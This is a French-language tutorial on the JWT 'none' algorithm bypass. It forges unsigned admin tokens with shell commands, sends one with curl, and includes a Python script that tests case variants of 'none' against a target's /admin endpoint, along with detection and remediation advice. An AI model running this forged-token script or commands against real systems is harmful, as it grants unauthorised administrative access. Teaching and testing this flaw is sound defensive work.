# 🚫 Algorithme "none" sur JWT

> **Auteur :** [@spectramz](https://github.com/exploit4040) — *"Le roi des pirates"* 🏴‍☠️
> **Catégorie :** Web Exploitation — Cryptographie
> **Difficulté :** ⭐☆☆☆☆
> **Tags :** `jwt`, `none`, `bypass`, `authentication`

---

## 📌 Table des matières

- [Contexte](#-contexte)
- [Principe de l'attaque](#-principe-de-lattaque)
- [Prérequis](#-prérequis)
- [Exploitation pas à pas](#-exploitation-pas-à-pas)
- [Variantes de casse](#-variantes-de-casse)
- [Détection](#-détection)
- [Remédiation](#-remédiation)
- [Références](#-références)

---

## 🎯 Contexte

Le standard JWT définit un algorithme spécial : **`none`**. Il indique explicitement qu'**aucune signature** n'est appliquée au token. Cet algorithme est prévu pour des cas très particuliers (tokens non sensibles, environnements de test).

Le problème : certaines bibliothèques JWT **acceptent** les tokens `alg: none` sans vérifier leur signature, ce qui permet à un attaquant de forger un token **sans aucun secret**.

Cette vulnérabilité, bien que très ancienne (CVE-2015-9235), existe encore dans de nombreuses applications.

---

## 🧠 Principe de l'attaque

### Token légitime


Header : {"alg": "HS256", "typ": "JWT"}
Payload : {"user": "guest"}
Signature : <HMAC-SHA256 calculée avec le secret>
text


### Token forgé

Header : {"alg": "none", "typ": "JWT"}
Payload : {"user": "admin"}
Signature : (vide)
text


**Le serveur, s'il accepte `none`, valide le token sans vérifier la signature.** On peut donc mettre n'importe quel payload (admin, root, sub=1…) sans connaître aucun secret.

---

## 📋 Prérequis

- Un JWT valide (peu importe l'algorithme d'origine)
- Un client HTTP (`curl`, Burp Suite, navigateur)
- Comprendre le format base64url

---

## 🛠️ Exploitation pas à pas

### Étape 1 — Récupérer un token

Intercepter un JWT via :
- Le cookie de session
- Le header `Authorization: Bearer <token>`
- Le localStorage

**Exemple** :

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.SIGNATURE
text


### Étape 2 — Décoder le header et le payload

```bash
# Header
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# {"alg":"HS256","typ":"JWT"}

# Payload
echo "eyJ1c2VyIjoiZ3Vlc3QifQ" | base64 -d
# {"user":"guest"}

Étape 3 — Forger un nouveau token

Header : changer HS256 en none
json

{"alg":"none","typ":"JWT"}

Encoder en base64url :
bash

echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '='
# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0

Payload : mettre admin
json

{"user":"admin"}

Encoder :
bash

echo -n '{"user":"admin"}' | base64 -w0 | tr '+/' '-_' | tr -d '='
# eyJ1c2VyIjoiYWRtaW4ifQ

Signature : vide

Token final :
text

eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.

Note : le point final est obligatoire. Un JWT doit toujours avoir 3 parties séparées par 2 points, même si la 3ᵉ est vide.
Étape 4 — Envoyer le token
bash

curl http://<cible>/admin \
  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ."

Réponse attendue : 200 OK avec les données admin.
🔄 Variantes de casse

Certaines bibliothèques sont sensibles à la casse ou acceptent des variantes. Il faut tester :
Variante	Header
none	{"alg":"none"}
None	{"alg":"None"}
NONE	{"alg":"NONE"}
nOnE	{"alg":"nOnE"}
none en clair	{"alg":"none","typ":"JWT"}
Sans signature	header.payload.
Sans point final	header.payload (rarement accepté)
Algorithme vide	{"alg":"","typ":"JWT"}

Script Python pour tester toutes les variantes :
python

#!/usr/bin/env python3
"""
Test de l'algorithme "none" avec toutes les variantes.
Auteur : SpectraMz
"""
import requests
import base64
import json
import sys

def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def forge_none_token(payload: dict, alg_variant: str) -> str:
    header = {"alg": alg_variant, "typ": "JWT"}
    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{header_b64}.{payload_b64}."

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <TARGET_URL>")
        sys.exit(1)

    target = sys.argv[1].rstrip("/")
    payload = {"username": "admin", "role": "admin"}

    variants = ["none", "None", "NONE", "nOnE", "nONE", "noNe", ""]

    for variant in variants:
        token = forge_none_token(payload, variant)
        r = requests.get(
            f"{target}/admin",
            headers={"Authorization": f"Bearer {token}"},
            timeout=10
        )
        print(f"[{variant or 'vide'}] Status: {r.status_code} - {r.text[:80]}")

if __name__ == "__main__":
    main()

🔍 Détection
Côté serveur

    Alerter si un token reçu utilise alg: none

    Rejeter les tokens sans signature (3ᵉ partie vide)

    Journaliser les algorithmes utilisés

Côté attaquant

    Tester systématiquement none sur chaque token trouvé

    Vérifier les réponses (200 vs 401)

🛡️ Remédiation
Code vulnérable
python

# ❌ Accepte tous les algorithmes, y compris "none"
jwt.decode(token, SECRET)

# ❌ Désactive la vérification (encore pire)
jwt.decode(token, options={"verify_signature": False})

Code sécurisé
python

# ✅ Force un algorithme précis
jwt.decode(token, SECRET, algorithms=["HS256"])

# ✅ Rejette explicitement "none"
ALLOWED_ALGORITHMS = ["HS256", "HS384", "HS512"]
if "none" in ALLOWED_ALGORITHMS:
    raise ValueError("none n'est pas autorisé")

Règles d'or
Règle	Détail
Forcer algorithms	Toujours passer une liste explicite
Ne jamais accepter none	Sauf cas très particuliers documentés
Vérifier le nombre de parties	3 parties obligatoires
Rejeter les signatures vides	Si le 3ᵉ segment est vide → rejet
Mettre à jour les bibliothèques	Les versions récentes rejettent none par défaut
📚 Références

    CVE-2015-9235 — jsonwebtoken

    Critical vulnerabilities in JWT libraries — Auth0

    RFC 7519 — Section 3.1 : alg

    PortSwigger — JWT Attacks

<p align="center"> <b>🏴‍☠️ SpectraMz — Stay Curious, Hack Ethically</b> </p> ```
